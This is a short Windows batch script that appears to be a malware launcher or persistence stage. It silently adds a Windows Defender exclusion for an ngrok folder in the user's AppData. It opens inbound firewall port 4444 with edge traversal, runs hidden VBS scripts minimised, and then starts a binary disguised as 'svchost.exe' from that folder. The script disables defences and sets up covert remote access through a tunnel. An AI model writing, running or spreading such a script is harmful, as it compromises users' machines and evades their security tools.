@echo off
setlocal

for /f "tokens=*" %%a in ('echo %USERNAME%') do set USERNAME=%%a
set "NGROK_PATH=C:\Users\%USERNAME%\AppData\Local\ngrok"

powershell -Command "$ngrokPath = '%NGROK_PATH%'; Add-MpPreference -ExclusionPath $ngrokPath" >nul 2>&1
powershell -Command "New-NetFirewallRule -DisplayName 'FlaskApp' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444 -Profile Any -EdgeTraversalPolicy Allow" >nul 2>&1

start /min "" "%NGROK_PATH%\nt.vbs"
start /min "" "%NGROK_PATH%\hst.vbs"

:CHECK_DOTNET
timeout /t 2 >nul
if exist "C:\Program Files\dotnet" (
    start "" "%NGROK_PATH%\svchost.exe"
    exit /b
)
goto CHECK_DOTNET

endlocal
